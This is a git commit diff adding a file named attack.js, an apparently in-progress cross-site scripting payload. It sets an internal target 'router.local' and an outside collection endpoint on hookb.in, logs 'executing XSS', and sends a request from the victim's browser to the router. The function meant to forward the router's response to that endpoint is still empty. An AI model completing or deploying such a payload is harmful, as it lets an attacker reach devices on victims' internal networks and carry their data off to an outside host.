72d2444bbf5802bf43f36243f9c1ef28ef0b48c6
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-02 17:31:16 -0500

    Add router call

--- attack.js
+++ attack.js
@@ -1,1 +1,18 @@
-console.log('hello');
+const ROUTER = "router.local";
+const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
+
+function forwardResponse(res) {
+}
+
+console.log('executing XSS');
+
+let xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function() {
+	if (xhr.readyState === 4) {
+		forwardResponse(xhr.response)
+	}
+}
+
+xhr.open("GET", ROUTER, true);
+xhr.send('');
